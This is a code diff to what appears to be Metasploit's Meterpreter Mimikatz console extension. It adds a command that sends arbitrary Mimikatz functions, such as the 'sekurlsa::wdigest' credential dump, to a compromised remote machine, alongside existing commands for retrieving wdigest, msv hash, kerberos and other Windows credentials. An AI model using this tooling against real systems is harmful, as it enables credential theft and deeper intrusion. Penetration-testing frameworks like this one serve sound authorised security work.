@@ -33,6 +33,7 @@ class Console::CommandDispatcher::Mimikatz
 	#
 	def commands
 		{
+			"mimikatz_command" => "Run a custom commannd",
 			"wdigest" => "Attempt to retrieve wdigest creds",
 			"msv" => "Attempt to retrieve msv creds (hashes)",
 			"livessp" => "Attempt to retrieve livessp creds",
@@ -40,6 +41,50 @@ class Console::CommandDispatcher::Mimikatz
 			"tspkg" => "Attempt to retrieve tspkg creds",
 			"kerberos" => "Attempt to retrieve kerberos creds"
 		}
+	end
+
+	@@command_opts = Rex::Parser::Arguments.new(
+		"-f" => [true, "The function to pass to the command."],
+		"-a" => [true, "The arguments to pass to the command."],
+		"-h" => [false, "Help menu."]
+	)
+
+	def cmd_mimikatz_command(*args)
+		if (args.length == 0)
+			args.unshift("-h")
+		end
+
+		cmd_args = nil
+		cmd_func = nil
+		arguments = []
+
+		@@command_opts.parse(args) { |opt, idx, val|
+			case opt
+				when "-a"
+					cmd_args = val
+				when "-f"
+					cmd_func = val
+				when "-h"
+					print(
+						"Usage: mimikatz_command -f func -a args\n\n" +
+						"Executes a mimikatz command on the remote machine.\n" +
+						"e.g. mimikatz_command -f sekurlsa::wdigest -a \"full\"\n" +
+						@@command_opts.usage)
+					return true
+			end
+		}
+
+		unless cmd_func
+			print_error("You must specify a function with -f")
+			return true
+		end
+
+		if cmd_args
+			arguments = cmd_args.split(" ")
+		end
+
+		print client.mimikatz.send_custom_command(cmd_func, arguments)
+		print_line
 	end
 
 	def mimikatz_request(provider, method)
